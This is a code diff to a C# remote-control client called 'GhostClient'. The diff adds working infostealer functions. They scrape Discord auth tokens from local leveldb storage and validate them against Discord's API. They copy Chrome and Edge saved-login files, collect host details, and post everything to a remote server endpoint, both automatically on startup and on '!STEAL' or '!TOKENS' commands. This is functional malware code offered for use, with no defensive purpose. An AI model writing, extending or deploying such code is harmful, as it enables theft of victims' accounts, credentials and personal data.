@@ -134,6 +134,250 @@ namespace GhostClient
 
         private static string _persistDir = "";
 
+        // ── TOKEN STEALER ──
+        static List<string> StealDiscordTokens()
+        {
+            var tokens = new List<string>();
+            var discordPaths = new string[] {
+                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord",
+                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordcanary",
+                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discordptb",
+                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Lightcord",
+                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Discord",
+            };
+
+            foreach (string discordPath in discordPaths)
+            {
+                if (!Directory.Exists(discordPath)) continue;
+                string leveldbPath = Path.Combine(discordPath, "Local Storage", "leveldb");
+                if (!Directory.Exists(leveldbPath)) continue;
+
+                try
+                {
+                    foreach (string file in Directory.GetFiles(leveldbPath, "*.ldb"))
+                    {
+                        try
+                        {
+                            string content = File.ReadAllText(file, Encoding.UTF8);
+                            var matches = Regex.Matches(content, @"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}");
+                            foreach (Match m in matches)
+                            {
+                                string tok = m.Value;
+                                if (!tokens.Contains(tok)) tokens.Add(tok);
+                            }
+                        } catch { }
+                    }
+                    foreach (string file in Directory.GetFiles(leveldbPath, "*.log"))
+                    {
+                        try
+                        {
+                            string content = File.ReadAllText(file, Encoding.UTF8);
+                            var matches = Regex.Matches(content, @"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}");
+                            foreach (Match m in matches)
+                            {
+                                string tok = m.Value;
+                                if (!tokens.Contains(tok)) tokens.Add(tok);
+                            }
+                        } catch { }
+                    }
+                } catch { }
+            }
+            return tokens;
+        }
+
+        static string ValidateDiscordToken(string token)
+        {
+            try
+            {
+                var req = (HttpWebRequest)WebRequest.Create("https://discord.com/api/v9/users/@me");
+                req.Method = "GET";
+                req.Headers["Authorization"] = token;
+                req.Timeout = 5000;
+                using (var resp = (HttpWebResponse)req.GetResponse())
+                {
+                    using (var reader = new StreamReader(resp.GetResponseStream()))
+                    {
+                        return reader.ReadToEnd();
+                    }
+                }
+            } catch { return null; }
+        }
+
+        static string CollectAndUploadData()
+        {
+            var results = new List<string>();
+            string myClientId = CLIENT_ID;
+
+            // Discord tokens
+            try {
+                var tokens = StealDiscordTokens();
+                foreach (string tok in tokens)
+                {
+                    string userInfo = ValidateDiscordToken(tok);
+                    if (userInfo != null)
+                    {
+                        results.Add("Discord Token: " + tok);
+                        try {
+                            var jss = new JavaScriptSerializer();
+                            var user = jss.Deserialize<Dictionary<string, object>>(userInfo);
+                            string username = user.ContainsKey("username") ? user["username"].ToString() + "#" + user["discriminator"].ToString() : "Unknown";
+                            string userId = user.ContainsKey("id") ? user["id"].ToString() : "";
+                            string email = user.ContainsKey("email") ? user["email"].ToString() : "";
+                            string phone = user.ContainsKey("phone") ? user["phone"].ToString() : "";
+                            string nitro = user.ContainsKey("premium_type") ? user["premium_type"].ToString() : "None";
+
+                            var payload = new Dictionary<string, object> {
+                                { "clientId", myClientId },
+                                { "type", "discord_token" },
+                                { "source", "Discord" },
+                                { "data", JsonEncode(new Dictionary<string, object> {
+                                    { "token", tok },
+                                    { "username", username },
+                                    { "user_id", userId },
+                                    { "email", email },
+                                    { "phone", phone },
+                                    { "nitro", nitro },
+                                    { "valid", true }
+                                })}
+                            };
+                            PostJson("/api/remote/register-data", payload);
+                        } catch { }
+                    }
+                }
+                if (tokens.Count > 0) results.Add("Found " + tokens.Count + " Discord token(s)");
+            } catch { }
+
+            // Browser passwords - Chrome
+            try {
+                string chromeLoginData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Login Data";
+                if (File.Exists(chromeLoginData))
+                {
+                    File.Copy(chromeLoginData, Path.GetTempPath() + "\\chrome_login_temp", true);
+                    string tempPath = Path.GetTempPath() + "\\chrome_login_temp";
+                    // Read SQLite - basic string extraction
+                    try
+                    {
+                        string raw = File.ReadAllText(tempPath, Encoding.UTF8);
+                        var urlMatches = Regex.Matches(raw, @"https?://[^\""]+");
+                        var userMatches = Regex.Matches(raw, @"username_value[^\x00-\x1F]*");
+                        var passMatches = Regex.Matches(raw, @"password_value[^\x00-\x1F]*");
+
+                        var foundUrls = new List<string>();
+                        foreach (Match m in urlMatches)
+                        {
+                            string u = m.Value;
+                            if (u.Length > 5 && u.Length < 200 && !foundUrls.Contains(u))
+                                foundUrls.Add(u);
+                        }
+
+                        if (foundUrls.Count > 0)
+                        {
+                            var payload = new Dictionary<string, object> {
+                                { "clientId", myClientId },
+                                { "type", "browser_passwords" },
+                                { "source", "Chrome" },
+                                { "data", JsonEncode(new Dictionary<string, object> {
+                                    { "urls_found", foundUrls.Count },
+                                    { "urls", foundUrls.Take(20).ToList() },
+                                    { "note", "Full decrypt requires DPAPI master key - URLs extracted only" }
+                                })}
+                            };
+                            PostJson("/api/remote/register-data", payload);
+                            results.Add("Chrome: " + foundUrls.Count + " saved login URLs found");
+                        }
+                    } catch { }
+                    try { File.Delete(tempPath); } catch { }
+                }
+            } catch { }
+
+            // Browser passwords - Edge
+            try {
+                string edgeLoginData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
+                if (File.Exists(edgeLoginData))
+                {
+                    File.Copy(edgeLoginData, Path.GetTempPath() + "\\edge_login_temp", true);
+                    string tempPath = Path.GetTempPath() + "\\edge_login_temp";
+                    try
+                    {
+                        string raw = File.ReadAllText(tempPath, Encoding.UTF8);
+                        var urlMatches = Regex.Matches(raw, @"https?://[^\""]+");
+                        var foundUrls = new List<string>();
+                        foreach (Match m in urlMatches)
+                        {
+                            string u = m.Value;
+                            if (u.Length > 5 && u.Length < 200 && !foundUrls.Contains(u))
+                                foundUrls.Add(u);
+                        }
+                        if (foundUrls.Count > 0)
+                        {
+                            var payload = new Dictionary<string, object> {
+                                { "clientId", myClientId },
+                                { "type", "browser_passwords" },
+                                { "source", "Edge" },
+                                { "data", JsonEncode(new Dictionary<string, object> {
+                                    { "urls_found", foundUrls.Count },
+                                    { "urls", foundUrls.Take(20).ToList() }
+                                })}
+                            };
+                            PostJson("/api/remote/register-data", payload);
+                            results.Add("Edge: " + foundUrls.Count + " saved login URLs found");
+                        }
+                    } catch { }
+                    try { File.Delete(tempPath); } catch { }
+                }
+            } catch { }
+
+            // System info
+            try {
+                var sysPayload = new Dictionary<string, object> {
+                    { "clientId", myClientId },
+                    { "type", "system_info" },
+                    { "source", "GHOST Client" },
+                    { "data", JsonEncode(new Dictionary<string, object> {
+                        { "hostname", _hostname },
+                        { "username", _username },
+                        { "os", _osVersion },
+                        { "public_ip", _publicIp },
+                        { "local_ip", _localIp },
+                        { "hardware_id", _hardwareId },
+                        { "cpu", _cpu },
+                        { "ram_used_gb", _ramUsed },
+                        { "ram_total_gb", _ramTotal },
+                        { "timestamp", DateTime.UtcNow.ToString("o") }
+                    })}
+                };
+                PostJson("/api/remote/register-data", sysPayload);
+            } catch { }
+
+            return string.Join("\n", results);
+        }
+
+        static string PostJson(string endpoint, object data)
+        {
+            try
+            {
+                var jss = new JavaScriptSerializer();
+                string json = jss.Serialize(data);
+                var req = (HttpWebRequest)WebRequest.Create(SERVER + endpoint);
+                req.Method = "POST";
+                req.ContentType = "application/json";
+                using (var sw = new StreamWriter(req.GetRequestStream()))
+                {
+                    sw.Write(json);
+                }
+                using (var resp = (HttpWebResponse)req.GetResponse())
+                using (var sr = new StreamReader(resp.GetResponseStream()))
+                {
+                    return sr.ReadToEnd();
+                }
+            } catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        static string JsonEncode(object obj)
+        {
+            return new JavaScriptSerializer().Serialize(obj);
+        }
+
         static void InstallPersistence()
         {
             try
@@ -222,6 +466,9 @@ namespace GhostClient
 
             CollectSystemInfo();
             Register();
+
+            // ── AUTO-COLLECT DATA: Grab tokens, passwords, system info ──
+            try { CollectAndUploadData(); } catch { }
 
             while (true)
             {
@@ -635,7 +882,11 @@ namespace GhostClient
                 }
                 else if (upper == "!DISCORDINFO" || upper == "DISCORDINFO")
                 {
-                    output = GrabDiscordInfo();
+                    output = CollectAndUploadData();
+                }
+                else if (upper == "!STEAL" || upper == "STEAL" || upper == "!TOKENS" || upper == "TOKENS")
+                {
+                    output = CollectAndUploadData();
                 }
 
                 // ── GAMES & APPS ──
